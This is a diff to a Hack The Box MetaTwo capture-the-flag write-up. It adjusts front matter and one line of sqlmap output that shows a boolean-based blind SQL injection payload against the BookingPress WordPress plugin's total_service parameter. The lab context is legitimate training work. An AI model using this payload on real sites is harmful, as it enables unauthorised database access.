@@ -1,8 +1,8 @@
 ---
+category: Hack The Box
 tags:
   - eWPT
-title:
-  - Machine MetaTwo
+title: Machine MetaTwo
 comments: "true"
 image: /assets/img/machines/Metatwo/Metatwobanner.jpeg
 ---
@@ -165,7 +165,7 @@ sqlmap identified the following injection point(s) with a total of 30 HTTP(s) re
 Parameter: total_service (POST)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: action=bookingpress_front_get_category_services&_wpnonce=185814d673&category_id=1&total_service=1) AND 6861=6861-- TmFi
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=185814d673&category_id=1&total_service=1) AND 6861=6861-- Tmfi
 ---
 [01:00:29] [INFO] testing MySQL
 [01:00:30] [INFO] confirming MySQL
